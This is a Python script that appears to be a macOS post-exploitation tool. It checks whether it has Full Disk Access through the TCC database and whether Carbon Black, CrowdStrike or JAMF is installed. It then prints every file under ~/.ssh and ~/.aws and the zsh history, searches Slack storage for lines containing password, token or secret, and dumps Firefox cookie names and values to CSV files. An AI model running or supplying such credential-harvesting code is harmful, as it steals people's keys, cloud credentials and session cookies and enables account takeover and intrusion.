import os,sqlite3
from os.path import expanduser, isfile
from os import walk
import csv

# Check FDA
home = expanduser("~")
tcc_db_path = home + "/Library/Application Support/com.apple.TCC/TCC.db"
print("\n*** Checking if app context has FDA ***\n")
has_fda = os.access(tcc_db_path, os.R_OK)
if has_fda:
    print("[+] App context has FDA - go ahead and access files in TCC protected directories\n")
else:
    print("[-] App context does not have FDA - be careful accessing TCC protected directories - User will be prompted by TCC\n")

# Check EDR and JAMF
print("*** Checking if EDR and JAMF are installed ***\n")    
carbon_black_binary_path = "/Applications/VMware Carbon Black Cloud/VMware CBCloud.app/Contents/MacOS/VMware CBCloud"
crowdstrike_binary_path = "/Applications/Falcon.app/Contents/Resources/falconctl"
jamf_binary_path = "/usr/local/bin/jamf"

if isfile(carbon_black_binary_path):
    print("[+] Carbon Black installed")
else:
    print("[-] Carbon Black not installed")

if isfile(crowdstrike_binary_path):
    print("[+] CrowdStrike installed")
else:
    print("[-] CrowdStrike not installed")

if isfile(jamf_binary_path):
    print("[+] JAMF installed")
else:
    print("[-] JAMF not installed")

# Check creds in /.ssh and /.aws
print("\n*** Checking creds in /.ssh and /.aws ***\n") 
ssh_path = home + "/.ssh"
aws_path = home + "/.aws"
for (dirpath, dirnames, filenames) in walk(ssh_path):
    for f in filenames:
        full_path = dirpath + "/" + f
        print("Contents of " + full_path)
        with open(full_path, "r",encoding="unicode_escape") as fl:
            print(fl.read())
            print("\n")

for (dirpath, dirnames, filenames) in walk(aws_path):
    for f in filenames:
        full_path = dirpath + "/" + f
        print("Contents of " + full_path)
        with open(full_path, "r",encoding="unicode_escape") as fl:
            print(fl.read())
            print("\n")

# Check slack storage for interesting files
print("\n*** Searching Slack storage for interesting files ***\n")
slack_storage_files_path = home + "/Library/Containers/com.tinyspeck.slackmacgap/Data/Library/Application Support/Slack/storage"
slack_alternate_storage_files_path = home + "/Library/Application Support/Slack/storage"
keywords_to_search = ["password", "secret", "sensitive", "confidential", "key", "token", "security"]

for path in [slack_storage_files_path, slack_alternate_storage_files_path]:
    for (dirpath, dirnames, filenames) in walk(path):
        for f in filenames:
            full_path = dirpath + "/" + f
            with open(full_path, "r",encoding="unicode_escape") as fl:
                file_lines = fl.readlines()
                for line in file_lines:
                    for keyword in keywords_to_search:
                        if keyword in line:
                            print("Found {} keyword in slack storage file {}".format(keyword, full_path))
                            print("Matching line: {}".format(line))

# Print history

history_path = home + "/.zsh_history"
if os.path.exists(history_path):
    print("\n*** Printing history ***\n")
    with open(history_path, "r",encoding="unicode_escape") as f:
        print(f.read())


# Grab firefox cookies
print("\n*** Grabbing firefox cookies ***\n")
firefox_profiles_path = home + "/Library/Application Support/Firefox/Profiles"
num = 1
for (dirpath, dirnames, filenames) in walk(firefox_profiles_path):
    for f in filenames:
        if f == "cookies.sqlite":
            cookies_full_path = dirpath + "/" + f
            destpath = home + "/" + "cookies.sqlite"
            with open(cookies_full_path, "rb") as source, open(destpath, "wb") as dest:
                dest.write(source.read())
            print("Writing cookie information to CSV file for cookie DB : " + cookies_full_path)
            conn = sqlite3.connect(destpath)
            c = conn.cursor()
            c.execute("select name,value,host,path,datetime(expiry,'unixepoch') as expiredate,isSecure,isHttpOnly,sameSite from moz_cookies")
            csv_file_path = f"firefox_cookies_file_{num}.csv"
            with open(csv_file_path, "w") as f:
                csvw = csv.writer(f)
                csvw.writerow(["name","value","host","path","expiredate","isSecure","isHttpOnly","sameSite"])
                for row in c:
                    csvw.writerow(row)

